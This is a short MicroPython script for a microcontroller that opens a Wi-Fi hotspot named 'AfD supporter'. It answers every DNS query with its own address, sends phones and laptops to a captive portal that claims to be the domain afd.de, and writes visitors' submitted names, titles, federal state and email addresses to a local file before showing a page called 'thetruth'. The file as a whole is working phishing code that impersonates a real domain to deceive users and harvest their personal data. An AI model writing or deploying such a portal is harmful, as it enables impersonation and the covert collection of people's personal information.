from phew import access_point, dns, server, logging
from phew.template import render_template
from os import stat


SSID = "AfD supporter"
DOMAIN = "afd.de"

HTDOCS = "htdocs"
data = "data/data.txt"

# öffnet anmelde webpage appel --> Android --> Windows
# Code 302 ist für das öffnen der index.html nötig das triggerd die weiterleitung 
@server.route("/hotspot-detect.html", methods=["GET"])
@server.route("/generate_204", methods=["GET"])
@server.route("/redirect", methods=["GET"])
def hotspot(request):
    logging.info("redirecting hotspot request " + request.path)
    return server.redirect(f"http://{DOMAIN}/", 302)

#zuständig für die weiterleitung bei Windows geräten 
@server.route("/ncsi.txt", methods=["GET"])
@server.route("/connecttest.txt", methods=["GET"])
def hotspot(request):
    return "", 200


# für das logging --> log.txt
@server.route("/log.txt", methods=["GET"])
def hotspot(request):
    return render_template("log.txt")


@server.route("/data.html", methods=["GET"])
def hotspot(request):
    logging.info("Got data: " + request.query_string)
    return render_template(HTDOCS + "/index.html")


@server.route("/thetruth", methods=['POST'])
def send(request):
    anrede = request.form.get("anrede")
    titel = request.form.get("titel")
    vorname = request.form.get("vorname")
    name = request.form.get("name")
    bundesland = request.form.get("bundesland")
    email = request.form.get("email")
    write_entry(f"Formular empfangen: {anrede}, {titel}, {vorname}, {name}, {bundesland}, {email}")
    return render_template(HTDOCS + "/thetruth.html")

    #return render_template("/thetruth.html")


@server.route("/", methods=['GET'])
def index(request):
    logging.info(HTDOCS + "/index.html")
    return render_template(HTDOCS + "/index.html")



def write_entry(entry):
    try:
        with open(data, 'a', encoding="utf-8") as file:
            file.write(entry + "\n")
        return  "saved", 200
    except OSError:
        return "cant write.", 404
    
# nimmt alle anfragen ohne eigenen endpunkt an 
@server.catchall()
def catch_all(request):
    try:
        stat(HTDOCS + request.path)
        return render_template(HTDOCS + request.path)
    except OSError:
        return "Not found.", 404

ap = access_point(SSID)
ip = ap.ifconfig()[0]
dns.run_catchall(ip)
server.run()
